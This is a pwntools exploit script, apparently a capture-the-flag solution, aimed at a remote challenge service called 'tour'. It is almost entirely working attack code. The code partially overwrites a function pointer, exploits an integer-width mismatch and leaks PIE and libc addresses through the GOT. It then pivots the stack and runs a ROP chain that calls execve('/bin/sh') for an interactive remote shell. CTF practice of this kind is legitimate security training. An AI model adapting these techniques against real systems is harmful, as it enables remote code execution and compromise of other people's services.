from pwn import *
context.binary = elf = ELF("./tour")
libc = ELF("./libc.so.6")

#io = elf.process()
#gdb.attach(io)

io = remote("cybergon2023.webhop.me", 5005)

# not used...
io.sendlineafter(b"name: ",b"lowbob")

# overwrite function pointer to 0x1c8e (return strcpy(&boarding_pass_data, &var_18)
# copy from stack to bss (contains PIE address)
io.sendlineafter(b"choice: ",b"1")
p = b"Q"*8
p += b"\x8e"
io.sendlineafter(b"?\n",p)
io.sendlineafter(b"choice: ",b"2")

# overwrite function pointer to special function (contains bof) 0x1ce7
io.sendlineafter(b"choice: ",b"1")
p = b"Q"*8
p += b"\xe7"
io.sendlineafter(b"?\n",p)
io.sendlineafter(b"choice: ",b"2")
# thunderstorm function has int64_t to int32_t mismatch
io.sendlineafter(b"do: ",b"4294967296")

# leak PIE
io.readuntil(b"is: \n")
boarding_pass = io.readline().strip()
print("pass",boarding_pass)
leak = u64(boarding_pass.ljust(8,b"\x00"))
print(hex(leak))
base = leak - 0x1ca4
print(hex(base))
elf.address = base

# answer questions to make money
io.sendlineafter(b"choice: ",b"3")
io.sendlineafter(b"Choose: ",b"1")
io.sendlineafter(b"?\n",b"Daw Aung San Suu Kyi")
io.sendlineafter(b"?\n",b"135")
io.sendlineafter(b"?\n",b"Hkakabo Razi")
io.sendlineafter(b"?\n",b"Shan State")
io.sendlineafter(b"Choose: ",b"4")

io.sendlineafter(b"choice: ",b"4")
io.sendlineafter(b"?\n",boarding_pass+b"\x00")

# 00001a74              fgets(buf: &buf_3, n: 0x32, fp: stdin)
# call fgets with rbp aligned to got
jump = elf.address+0x1a54
pop_rbp = elf.address+0x1253

p = p64(elf.got['exit']+0xe0)
p += p64(jump)#b"D"*0x8#p64(elf.symbols['_start'])
p += b"C"*8
p += p64(jump)
io.sendlineafter(b"?: ",p)
io.sendlineafter(b"choice: ",b"2")
"""
00001b89                  for (int32_t i_1 = 0; i_1 s<= 3; i_1 = i_1 + 1) {
00001b7c                      puts(str: sx.q(i_1) * 0x32 + &buf)
00001b76                  }
"""
# loop and print off got to get libc
puts_shit = elf.address+0x1b51
ret = elf.address+0x1b92
p = b"A"*10
p += p64(ret)
p += p64(pop_rbp)
p += p64(elf.got['atoi']+0xe0)
p += p64(puts_shit)
io.sendline(p)
# leaked atoi, lines up so chain continues
io.readuntil(b"ride!\n")
libc_leak = u64(io.readline().strip().ljust(8,b"\x00"))
print(hex(libc_leak))

libc.address = libc_leak - libc.symbols['atoi'] 
print(hex(libc.address))

pause()
# rop only have 3 gadgets
# pivot to 00171061          rax_1 = __read(arg1, rbp, rbx)
# can only read 0x32 bytes though onto bss
leave_ret = elf.address+0x1b91
pop_rdi = libc.address+0x000000000002a3e5
p  = b"\x00"*(0x32-12-8)
p += p64(pop_rbp)
p += p64(elf.address+16759)
p += p64(libc.address+0x171058)
io.send(p)
pause()

#pivot again but read 0x300 bytes for long chain
syscall = libc.address+0x140ffb
pop_rdx_12 = libc.address+0x000000000011f497# : pop rdx ; pop r12 ; ret
pop_rsi = libc.address+0x000000000002be51# : pop rsi ; ret
pop_rax = libc.address+0x0000000000045eb0# : pop rax ; ret
p3  = p64(pop_rdx_12)
p3 += p64(0x300)
p3 += b"I"*8
p3 += p64(syscall)
p3 += b"O"*0x31
# now call execve(/bin/sh,0,0)
p3 += p64(pop_rax)
p3 += p64(0x3b)
p3 += p64(pop_rdi)
p3 += p64(next(libc.search(b"/bin/sh")))
p3 += p64(pop_rsi)
p3 += p64(0)
p3 += p64(pop_rdx_12)
p3 += p64(0)*2
p3 += p64(syscall)
io.send(p3)
# win

io.interactive()
